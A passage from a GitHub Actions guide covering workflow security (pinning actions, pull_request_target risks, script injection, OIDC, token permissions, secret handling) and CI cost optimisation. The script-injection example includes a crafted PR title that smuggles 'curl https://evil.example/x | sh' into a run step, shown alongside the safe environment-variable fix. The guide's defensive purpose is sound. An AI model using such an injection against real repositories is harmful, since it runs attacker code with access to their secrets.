      - uses: actions/setup-dotnet@v6
        with:
          dotnet-version: "10.0.x"
      - name: Audit NuGet packages
        run: dotnet list package --vulnerable --include-transitive

  stale-issues:
    runs-on: ubuntu-latest
    permissions:
      issues: write
      pull-requests: write
    steps:
      - uses: actions/stale@v11
        with:
          stale-issue-message: "This issue has been automatically marked as stale after 60 days of inactivity."
          days-before-stale: 60
          days-before-close: 14
```

## Security Considerations

### Third-Party Action Risks

Every action you `uses` in a workflow runs with the same permissions as your workflow. A compromised or malicious action could exfiltrate secrets, modify your repository, or push malicious code. Treat third-party actions like third-party dependencies, because they're code you're executing with elevated trust. Real compromises of popular actions have happened, where an attacker moved every version tag to malicious code, and workflows pinned to SHAs were the ones unaffected.

Mitigations:

- Pin actions to full commit SHAs rather than mutable tags
- Prefer actions from well-known publishers (GitHub itself, major vendors) over unknown community actions
- Review action source code before using it, especially for actions requesting broad permissions
- Use [GitHub's dependency review action](https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/about-dependency-review){:target="_blank" rel="noopener noreferrer"} to flag newly added or vulnerable actions in PRs
- Configure Dependabot to keep pinned action versions updated
- Restrict which actions can run at all with the organization's allowed-actions policy

### The pull_request_target Danger

`pull_request_target` runs the workflow file from the repository's default branch, with access to secrets and a token that can write, even for pull requests from forks. That makes it useful for tasks that need privileges, like labeling or commenting on PRs from forks. It becomes dangerous the moment the workflow checks out and runs the PR's code, because an attacker submitting a PR can then execute arbitrary code with those secrets and that token.

GitHub has narrowed the risk twice. Since December 2025, the workflow file and the checkout commit for `pull_request_target` always come from the default branch, so an old vulnerable copy of the workflow on another branch can no longer be targeted. Since mid-2026, `actions/checkout` refuses to fetch fork PR code in `pull_request_target` and `workflow_run` workflows unless the step sets `allow-unsafe-pr-checkout`, an input named to stand out in code review. Neither change protects a workflow that deliberately opts in, or one that runs PR content some other way.

The safe pattern separates untrusted code execution from privileged operations:

```yaml
# Trigger from pull_request (no write access) to run untrusted code
# Then use workflow_run to post results with write access
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
```

The first workflow runs the untrusted code under `pull_request`, with a read-only token and no secrets, and uploads its results as an artifact. The second, triggered by `workflow_run`, has write access but only reads that artifact as data and never executes anything from it. Never combine `pull_request_target` with steps that check out and execute the PR's code.

### Script Injection

Expressions inside `${{ }}` are substituted into a `run` script before the shell sees it. When the value comes from something an outsider controls, such as a PR title, branch name, issue body, or commit message, the attacker controls part of your script:

```yaml
# Dangerous: a PR titled  a"; curl https://evil.example/x | sh; echo "  runs the attacker's command
- run: echo "Checking ${{ github.event.pull_request.title }}"

# Safe: pass the value through an environment variable, which the shell treats as data
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $PR_TITLE"
```

The same rule applies to inputs of `workflow_dispatch` and to any `github.event` field that carries free text. Static analysis tools like CodeQL's Actions queries and [zizmor](https://github.com/zizmorcore/zizmor){:target="_blank" rel="noopener noreferrer"} flag these patterns automatically.

### OIDC Instead of Stored Cloud Credentials

Deploying to a cloud provider traditionally meant storing a long-lived access key as a secret, where it can leak and has to be rotated by hand. OpenID Connect (OIDC) removes the stored key. The job asks GitHub for a short-lived signed token that states which repository, branch, environment, and workflow it is running as, and the cloud provider exchanges that token for temporary credentials, but only if the claims match a trust policy you configured on the provider side.

```yaml
permissions:
  id-token: write   # allows the job to request the OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: us-east-1
      - run: aws s3 sync ./site s3://my-bucket
```

The security of the setup lives in the provider's trust policy. It should match the token's `sub` claim narrowly, for example `repo:my-org/my-app:environment:production`, so that only deployments through the protected production environment can assume the production role. A policy that trusts any repository in the organization, or any branch, hands those credentials to far more code than intended. AWS, Azure, Google Cloud, and HashiCorp Vault all support this pattern through their own login actions.

### Least-Privilege GITHUB_TOKEN

Depending on the repository's default setting, the `GITHUB_TOKEN` may have far broader permissions than a workflow needs. Restrict it explicitly:

```yaml
permissions: {}  # Deny all by default at workflow level

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # Only what this job actually needs
    steps:
      - uses: actions/checkout@v7
      - run: dotnet test

  comment:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write  # Only what this job actually needs
    steps:
      - name: Post results
        env:
          GH_TOKEN: ${{ github.token }}
        run: gh pr comment ${{ github.event.number }} --repo ${{ github.repository }} --body "Tests passed"
```

Setting `permissions: {}` at the workflow level and then granting individual jobs only what they need is the safest posture.

### Secret Handling

Secrets are masked in logs, but you can still accidentally expose them through other means. Don't echo secrets directly, write them into files that get uploaded as artifacts, or include them in error messages. Pass secrets to steps through environment variables rather than command-line arguments, since arguments can appear in process listings. When a step derives a new sensitive value at runtime, register it for masking with `echo "::add-mask::$VALUE"` before anything prints it.

## Cost and Performance

### Free Tier and Billing

Standard GitHub-hosted runners are free and unmetered for public repositories, and self-hosted runners are free everywhere. For private repositories, each plan includes a monthly allocation of minutes (2,000 on Free, 3,000 on Pro and Team, 50,000 on Enterprise Cloud), and usage beyond that is billed per minute at rates that depend on the runner. As of September 2026, the standard rates are:

| Runner | Per minute | Relative to Linux |
|---|---|---|
| Linux (2 CPUs) | $0.006 | 1x |
| Windows (2 CPUs) | $0.010 | About 1.7x |
| macOS | $0.062 | About 10x |

These numbers change, so check the [Actions billing page](https://docs.github.com/en/billing/concepts/product-billing/github-actions){:target="_blank" rel="noopener noreferrer"} before budgeting. The ratios are more durable than the prices, and they push toward Linux wherever a job can run there. Larger runners are billed at higher rates and are never covered by the included minutes.

### Optimization Strategies

**Cache aggressively.** Dependency installation is often the largest time cost in CI. A well-configured cache can reduce a 5-minute job to under a minute. Set up caching for your package manager, and use the GitHub Actions cache for Docker build layers as well.

**Use concurrency groups to avoid waste.** When a developer pushes multiple commits in quick succession, older in-progress runs are often rendered irrelevant by the new push. `cancel-in-progress: true` on CI workflows stops paying for runs that will never matter.

**Make jobs conditional.** A documentation change shouldn't trigger a full test suite run. Path filters on `push` and `pull_request` events prevent unnecessary executions, and in monorepos they matter most, because each workflow can run only on changes in its own directory.

**Parallelize with matrix strategies.** If your test suite takes 10 minutes to run sequentially, splitting it into 5 parallel shards can bring wall time down to around 2 minutes. The compute consumed stays roughly the same, plus each shard's setup time and per-job rounding up to the next minute, but developers wait far less.

**Pull common setup into composite actions.** When multiple workflows each install the same tools in the same way, a composite action that includes caching makes every one of them fast, instead of each workflow tuning its own setup separately.

**Choose `ubuntu-latest` as the default.** Unless you specifically need Windows or macOS capabilities, Linux is usually the fastest and cheapest option, and the savings compound across hundreds of workflow runs per month.
{% endraw %}
